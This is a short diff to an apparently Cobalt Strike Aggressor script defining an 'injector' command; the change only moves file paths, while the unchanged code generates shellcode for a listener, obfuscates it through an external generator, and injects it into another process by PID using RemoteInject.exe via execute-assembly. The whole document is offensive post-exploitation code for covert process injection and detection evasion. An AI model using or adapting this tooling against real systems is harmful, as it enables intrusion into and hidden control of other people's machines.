@@ -10,7 +10,7 @@ alias injector {
 	# 4 arch
 	blog($1, "Generating " . $4 . " shellcode for " . $3 . " listener."); 
 	$data = base64_encode(artifact($3, "raw", "", $4));
-	$handle = exec("python /opt/cobalt_strike_extension_kit/scripts/subscripts/generator.py -s \"" . $data . "\" -a " . $4);
+	$handle = exec("python /opt/cobaltstrike/custom/csek/scripts/subscripts/generator.py -s \"" . $data . "\" -a " . $4);
 	if (checkError($error)) {
 		warn($error);
 	}
@@ -19,6 +19,6 @@ alias injector {
 	closef($handle);
 
 	blog($1, "Injecting the obfuscated shellcode into process with PID:  " . $2); 
-	bexecute_assembly($1, "/opt/cobalt_strike_extension_kit/exe/RemoteInject.exe", $2 . " " . $obfuscated);
+	bexecute_assembly($1, "/opt/cobaltstrike/custom/csek/exe/RemoteInject.exe", $2 . " " . $obfuscated);
 	blog($1, "Process completed."); 
 }
